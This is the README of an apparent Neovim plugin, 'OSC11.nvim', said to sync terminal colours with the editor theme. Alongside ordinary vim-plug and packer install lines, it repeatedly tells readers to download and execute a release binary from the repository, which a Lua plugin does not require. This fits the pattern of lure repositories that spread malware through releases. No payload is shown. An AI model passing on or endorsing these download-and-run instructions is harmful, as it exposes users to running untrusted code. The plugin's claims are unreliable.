# OSC11.nvim 🌈

![OSC11.nvim](https://img.shields.io/badge/OSC11.nvim-v1.0.0-brightgreen)

Welcome to **OSC11.nvim**, a lightweight Neovim plugin designed to synchronize your terminal theme automatically via OSC 11. This plugin enhances your coding experience by ensuring that your terminal colors match your Neovim theme seamlessly.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Configuration](#configuration)
- [Contributing](#contributing)
- [License](#license)
- [Releases](#releases)

## Features

- **Automatic Theme Synchronization**: Automatically sync your terminal colors with your Neovim theme using OSC 11.
- **Lightweight**: Minimal performance impact on your Neovim setup.
- **Easy to Use**: Simple installation and configuration process.

## Installation

To install **OSC11.nvim**, you can use your preferred plugin manager. Here’s how to do it with a few popular ones:

### Using `vim-plug`

Add the following line to your `init.vim` or `init.lua`:

```vim
Plug 'blueuld1/OSC11.nvim'
```

Then, run the following command in Neovim:

```vim
:PlugInstall
```

### Using `packer.nvim`

Add this line to your `plugins.lua`:

```lua
use 'blueuld1/OSC11.nvim'
```

Then, run the following command in Neovim:

```lua
:PackerSync
```

After installation, you can download and execute the latest release from [here](https://github.com/blueuld1/OSC11.nvim/releases).

## Usage

Once you have installed the plugin, it will automatically synchronize your terminal colors with your Neovim theme. No additional commands are necessary.

To manually trigger synchronization, you can use the command:

```vim
:SyncTheme
```

This command will immediately apply the current Neovim theme to your terminal.

## Configuration

You can customize the behavior of **OSC11.nvim** through your Neovim configuration file. Here are some options you can set:

### Example Configuration

```vim
" Enable or disable automatic synchronization
let g:osc11_auto_sync = 1  " 1 to enable, 0 to disable

" Set the terminal type
let g:osc11_terminal_type = 'xterm-256color'
```

Make sure to restart Neovim after making changes to your configuration file.

## Contributing

We welcome contributions to **OSC11.nvim**! If you have suggestions, bug reports, or want to add features, please feel free to open an issue or submit a pull request.

### Steps to Contribute

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch to your forked repository.
5. Open a pull request.

## License

**OSC11.nvim** is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.

## Releases

To keep up with the latest updates and features, check the [Releases](https://github.com/blueuld1/OSC11.nvim/releases) section. You can download the latest version and execute it to get the newest features and fixes.

---

Thank you for using **OSC11.nvim**! We hope this plugin enhances your Neovim experience. If you have any questions or feedback, feel free to reach out or check the [Releases](https://github.com/blueuld1/OSC11.nvim/releases) for more information.